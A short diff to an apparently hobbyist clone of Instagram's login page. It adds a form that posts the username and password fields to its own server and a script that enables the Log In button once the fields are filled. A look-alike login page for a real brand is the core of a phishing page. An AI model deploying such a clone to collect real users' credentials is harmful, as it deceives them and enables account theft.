@@ -9,15 +9,17 @@
 </head>
 <body>
 <center>
+<form action="/" method="POST">
 	<div class="login">
 		<div class="title"></div>
-		<input type="text" placeholder="Phone number, username, or email">
-		<input type="password" placeholder="Password">
-		<input type="submit" value="Log In">
+		<input type="text" placeholder="Phone number, username, or email" onkeyup="check()" id="e">
+		<input type="password" placeholder="Password" id="p" onkeyup="check()">
+		<input type="submit" value="Log In" id="s" disabled="true">
 		<p>_________________ OR _________________</p>
 		<div class="fb"><a href=""><div class="img"></div><b>Log in with Facebook</b></a></div>
 		<div class="forgot">Forgot password?</div>
 	</div>
+</form>
 	<div class="create">
 		<div class="new">Don't have an account?<a href="">Sign up</a></div>
 	</div>
@@ -41,5 +43,18 @@
 		<a href="">© 2021 Instagram from Facebook</a>
 	</div>
 </center>
+<script type="text/javascript">
+	function check(){
+		if(document.getElementById("e").value==""){
+			document.getElementById("s").disabled = true;
+		}else{
+			if (document.getElementById("p").value.length < 6) {
+				document.getElementById("s").disabled = true;
+			}else{
+				document.getElementById("s").disabled = false;
+			}
+		}
+	}
+</script>
 </body>
 </html>
